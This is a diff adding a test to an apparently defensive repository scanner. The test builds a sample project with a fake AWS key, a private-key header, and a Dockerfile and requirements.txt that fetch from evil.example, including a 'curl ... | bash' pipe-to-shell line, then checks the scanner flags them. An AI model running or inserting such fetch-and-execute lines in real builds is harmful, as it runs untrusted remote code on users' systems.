@@ -550,3 +550,39 @@ def test_cli_ioc_commands(tmp_path, monkeypatch, capsys):
     assert valid_sha in out and "CLI_Trojan" in out
     assert cli.main(["ioc", "remove", valid_sha]) == 0
     assert cli.main(["ioc", "remove", valid_sha]) == 1
+
+
+def test_secret_leaks_dockerfile_requirements_and_doctor(tmp_path, monkeypatch, capsys):
+    import json
+
+    scan_dir = tmp_path / "supply_chain_sample"
+    scan_dir.mkdir()
+    (scan_dir / "config.py").write_text(
+        'AWS_KEY = "AKIA1234567890ABCDEF"\n'
+        'KEY_PEM = "-----BEGIN OPENSSH PRIVATE KEY-----"\n',
+        encoding="utf-8",
+    )
+    (scan_dir / "Dockerfile").write_text(
+        "FROM python:3.11\nADD http://evil.example/agent.tar.gz /tmp/\nRUN curl https://evil.example/a.sh | bash\n",
+        encoding="utf-8",
+    )
+    (scan_dir / "requirements.txt").write_text(
+        "fastapi>=0.110.0\nhttp://evil.example/evil-pkg.tar.gz\n",
+        encoding="utf-8",
+    )
+
+    report = repo_scanner.scan_repository(str(scan_dir), quiet=True)
+    assert report["verdict"] == "DO_NOT_INSTALL"
+    threats = {item["threat"] for item in report["findings"]}
+    assert "Exposed AWS Access Key ID" in threats
+    assert "Exposed Private Key Material" in threats
+    assert "Dockerfile Pipe-to-Shell Execution" in threats
+    assert "Insecure Plaintext HTTP ADD in Dockerfile" in threats
+    assert "Insecure Plaintext HTTP Dependency in requirements.txt" in threats
+
+    monkeypatch.setenv("COGNIGUARD_DB_PATH", str(tmp_path / "doc.db"))
+    monkeypatch.setenv("COGNIGUARD_QUARANTINE_DIR", str(tmp_path / "doc_vault"))
+    assert cli.main(["doctor", "--json"]) == 0
+    doc_out = json.loads(capsys.readouterr().out)
+    assert doc_out["status"] == "OK"
+    assert doc_out["git_available"] is True
